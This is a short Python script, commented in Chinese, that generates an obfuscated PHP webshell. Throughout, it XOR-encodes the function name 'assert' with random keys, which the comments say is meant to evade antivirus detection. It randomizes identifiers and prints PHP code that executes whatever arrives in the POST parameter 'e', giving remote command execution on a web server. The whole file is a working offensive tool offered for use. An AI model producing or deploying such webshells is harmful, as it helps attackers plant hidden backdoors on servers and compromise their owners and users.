import random

# 命令执行函数
func1 = 'assert'

# 每次生成一个不同的变量（函数）名，长度为len
def random_name(len):
    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))

# 每次返回一个len长度的字符串（里面包含特殊字符，用于异或免杀）
def random_keys(len):
    str = '`~-=!@#$%^&*_/+?<>{}|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    a = random.sample(str, len)
    return ''.join(a)

# 将字符c1和字符c2进行异或运算，同时将0x转换成x
def xor(c1,c2):
    c = hex(ord(c1)^ord(c2))
    return c.replace('0x',r"x")


# payload生成函数
def gen_payload(func):
    func_line1 = ''
    func_line2 = ''
    key = random_keys(len(func))
    for i in range(0,len(func)):
        enc = xor(func[i],key[i])
        func_line1 += key[i]
        func_line2 += enc
    payload = '"{0}"^"{1}"'.format(func_line1,func_line2)
    return payload


shell_form='''
<?php
function {func_name}(${var_name1}, ${var_name2}){{
    ${var_name3}=${var_name2};
    \array_walk(${var_name1}, ${var_name3});
}}
${var_name4} = {func1};
{func_name}(array($_POST['e']), ${var_name4});
?>
'''

def gen_webshell():
    webshell=shell_form.format(func_name=random_name(4), var_name1=random_name(4), var_name2=random_name(4), var_name3=random_name(4), var_name4=random_name(4), func1=gen_payload(func1))
    print(webshell)

gen_webshell()